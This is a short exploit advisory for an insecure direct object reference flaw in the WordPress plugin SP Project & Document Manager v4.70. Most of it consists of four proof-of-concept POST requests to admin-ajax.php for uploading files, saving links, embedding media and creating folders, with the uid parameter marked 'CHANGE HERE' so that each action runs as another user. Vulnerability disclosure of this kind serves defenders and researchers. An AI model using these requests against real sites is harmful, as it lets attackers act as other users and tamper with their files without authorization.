# Exploit Title: SP Project & Document Manager v4.70 - Insecure Direct Object Reference(IDOR)
## Date: 2/20/2024
## Vendor Homepage: https://cn.wordpress.org/plugins/sp-client-document-manager/
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SP Project & Document Manager
## Version: v4.70
## Exploit Description:
## SP Project & Document Manager v4.70 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to pretend to be another user to upload files/add link/add video/add sub folder in folder(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /wp-admin/admin-ajax.php HTTP/1.1
...

Cookie: ...; pid=1
Connection: close

------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="file[]"; filename="IMG_0628.PNG"
Content-Type: image/png

...

------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="action"

sp_file_upload_callback
------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="uid"

2(CHANGE HERE)
------WebKitFormBoundaryX4YnPgSA4oPHlNjv
...

```
```
POST /wp-admin/admin-ajax.php HTTP/1.1
...

pid=2&action=sp_cdm_link_save_embed&uid=2(CHANGE HERE)&link-name=link1&link-url=http%3A%2F%2Flocalhost%3A8020%2Flink1&dlg-upload-notes=aaa
```
```
POST /wp-admin/admin-ajax.php HTTP/1.1
...

pid=2&action=sp_cdm_media_save_embed&uid=3(CHANGE HERE)&file-name=video2&embed=22222&dlg-upload-notes=bbb
```
```
POST /wp-admin/admin-ajax.php HTTP/1.1
...
Cookie: ...; pid=2

action=cdm_save_category&name=folder22&uid=3(CHANGE HERE)&parent=2
```
